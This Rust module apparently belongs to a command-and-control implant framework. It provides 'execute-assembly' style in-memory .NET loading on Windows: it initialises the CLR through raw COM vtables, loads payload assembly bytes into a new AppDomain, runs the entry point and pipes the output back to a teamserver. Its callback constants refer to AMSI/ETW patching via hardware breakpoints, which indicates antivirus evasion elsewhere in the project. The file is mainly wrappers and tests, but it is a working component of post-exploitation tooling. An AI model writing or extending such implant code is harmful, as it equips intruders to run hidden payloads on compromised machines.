//! .NET CLR hosting for inline assembly execution.
//!
//! On Windows, loads mscoree.dll and oleaut32.dll at runtime, walks the COM
//! vtables for `ICLRMetaHost` → `ICLRRuntimeInfo` → `ICorRuntimeHost`, creates
//! an AppDomain, loads the assembly via `_AppDomain::Load_3`, resolves the entry
//! point, and invokes it with `_MethodInfo::Invoke_3`.  Stdout is captured via a
//! named pipe whose path is supplied by the teamserver.
//!
//! All COM vtable calls are raw FFI through manually-defined vtable indices —
//! no `winapi` crate, only `windows-sys` for flat Win32 function imports.
//!
//! # Module layout
//!
//! | Module | Contents |
//! |--------|----------|
//! | `runtime` | COM types, constants, [`ClrSession`], DLL loading, CLR host init |
//! | `appdomain` | AppDomain creation, assembly load, entry-point invocation |
//! | `assembly` | Pipe I/O, arg parsing, top-level `execute` driver |

#[cfg(not(windows))]
use tracing::warn;

#[cfg(windows)]
mod appdomain;
#[cfg(windows)]
mod assembly;
#[cfg(windows)]
pub(crate) mod runtime;

// ─── .NET callback info IDs (agent → server) ────────────────────────────────

/// AMSI/ETW patches have been applied (hardware breakpoint engine).
pub const DOTNET_INFO_PATCHED: u32 = 1;
/// Reports the CLR version string being used.
pub const DOTNET_INFO_NET_VERSION: u32 = 2;
/// Assembly entry point has been invoked; includes the thread ID.
pub const DOTNET_INFO_ENTRYPOINT_EXECUTED: u32 = 3;
/// Assembly execution completed successfully.
pub const DOTNET_INFO_FINISHED: u32 = 4;
/// CLR initialisation or assembly execution failed.
pub const DOTNET_INFO_FAILED: u32 = 5;

/// A single .NET execution callback to send to the teamserver.
#[derive(Debug)]
pub struct DotnetCallback {
    /// One of the `DOTNET_INFO_*` constants.
    pub info_id: u32,
    /// Payload bytes for this callback (info-specific encoding).
    pub payload: Vec<u8>,
}

/// Result of a .NET assembly execution attempt.
#[derive(Debug)]
pub struct DotnetResult {
    /// Callback entries to send back to the teamserver.
    pub callbacks: Vec<DotnetCallback>,
    /// Captured stdout output from the assembly, if any.
    pub output: Vec<u8>,
}

// ─── Public API ──────────────────────────────────────────────────────────────

/// Execute a .NET assembly using the CLR.
///
/// On Windows, loads mscoree.dll and oleaut32.dll at runtime, walks COM vtables
/// to initialise the CLR, creates an AppDomain, loads the assembly, and invokes
/// its entry point.  Stdout is captured via the named pipe at `pipe_name`.
///
/// On non-Windows, returns [`DOTNET_INFO_FAILED`] immediately.
///
/// # Arguments
///
/// * `pipe_name` — Named pipe path for stdout capture (e.g. `\\.\pipe\xyz`).
/// * `app_domain` — AppDomain name.
/// * `net_version` — Target CLR version string (e.g. `"v4.0.30319"`).
/// * `assembly_data` — Raw .NET PE bytes.
/// * `assembly_args` — Command-line arguments for the assembly.
#[cfg(windows)]
pub fn dotnet_execute(
    pipe_name: &str,
    app_domain: &str,
    net_version: &str,
    assembly_data: &[u8],
    assembly_args: &str,
) -> DotnetResult {
    assembly::execute(pipe_name, app_domain, net_version, assembly_data, assembly_args)
}

/// On non-Windows targets, .NET assembly execution is unsupported.
#[cfg(not(windows))]
pub fn dotnet_execute(
    _pipe_name: &str,
    _app_domain: &str,
    _net_version: &str,
    _assembly_data: &[u8],
    _assembly_args: &str,
) -> DotnetResult {
    warn!(".NET assembly execution is only supported on Windows");
    DotnetResult {
        callbacks: vec![DotnetCallback { info_id: DOTNET_INFO_FAILED, payload: Vec::new() }],
        output: Vec::new(),
    }
}

/// Enumerate installed CLR versions.
///
/// On Windows, checks well-known registry keys that indicate installed .NET
/// Framework versions.  Returns version strings (e.g. `"v4.0.30319"`).
///
/// On non-Windows, returns an empty list.
#[cfg(windows)]
pub fn enumerate_clr_versions() -> Vec<String> {
    runtime::enumerate_clr_versions_impl()
}

/// On non-Windows, no CLR versions are available.
#[cfg(not(windows))]
pub fn enumerate_clr_versions() -> Vec<String> {
    Vec::new()
}

// ─── Tests ───────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    /// On non-Windows the stub returns a single FAILED callback.
    #[cfg(not(windows))]
    #[test]
    fn non_windows_dotnet_returns_failed() {
        let result = dotnet_execute("pipe", "domain", "v4.0.30319", b"MZ\x90\x00", "args");
        assert_eq!(result.callbacks.len(), 1);
        assert_eq!(result.callbacks[0].info_id, DOTNET_INFO_FAILED);
    }

    #[cfg(not(windows))]
    #[test]
    fn non_windows_enumerate_returns_empty() {
        assert!(enumerate_clr_versions().is_empty());
    }

    #[test]
    fn dotnet_info_constants_match_teamserver() {
        assert_eq!(DOTNET_INFO_PATCHED, 1);
        assert_eq!(DOTNET_INFO_NET_VERSION, 2);
        assert_eq!(DOTNET_INFO_ENTRYPOINT_EXECUTED, 3);
        assert_eq!(DOTNET_INFO_FINISHED, 4);
        assert_eq!(DOTNET_INFO_FAILED, 5);
    }

    #[cfg(not(windows))]
    #[test]
    fn parse_assembly_args_empty() {
        // Can't call assembly::parse_assembly_args on non-Windows since it's
        // inside cfg(windows), but we test the public API path.
        let result = dotnet_execute("pipe", "domain", "v4.0.30319", b"MZ", "");
        assert_eq!(result.callbacks.len(), 1);
        assert_eq!(result.callbacks[0].info_id, DOTNET_INFO_FAILED);
    }

    /// Windows CLR integration test — only runs on actual Windows with .NET
    /// Framework installed.  Validates that the CLR initialisation path does
    /// not crash and returns appropriate callbacks.
    #[cfg(windows)]
    #[test]
    fn windows_dotnet_empty_assembly_returns_failed() {
        // Empty/garbage assembly bytes should fail at Load_3.
        let result = dotnet_execute(
            "\\\\.\\pipe\\specter_test_dotnet",
            "SpecterTest",
            "v4.0.30319",
            b"",
            "",
        );
        // Should have at least one callback.
        assert!(!result.callbacks.is_empty());
        // With empty assembly data, we expect failure somewhere in the chain.
        let last = result.callbacks.last().expect("non-empty callbacks");
        assert!(
            last.info_id == DOTNET_INFO_FAILED || last.info_id == DOTNET_INFO_FINISHED,
            "unexpected final callback: {}",
            last.info_id
        );
    }
}
